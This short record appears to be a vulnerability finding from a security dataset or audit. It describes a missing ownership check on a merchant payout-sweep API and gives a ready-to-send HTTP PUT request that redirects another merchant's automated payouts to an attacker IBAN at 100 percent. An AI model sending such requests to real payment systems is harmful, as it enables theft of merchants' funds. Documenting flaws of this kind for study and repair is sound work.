diagnosis: The route updates the destination banking IBAN and percentage of a recurring automated revenue sweep schedule without checking if sweep.merchant_id == current_user.merchant_id. An attacker can divert automated daily cron sweep payouts of rival merchants into an attacker-controlled bank account.
exploit_request:
PUT /api/v1/payout-sweeps/schedules/10492/destination HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_merchant_token>
Content-Type: application/json

{"destination_iban": "GB82WEST12345698765432", "sweep_percentage": 100.0}
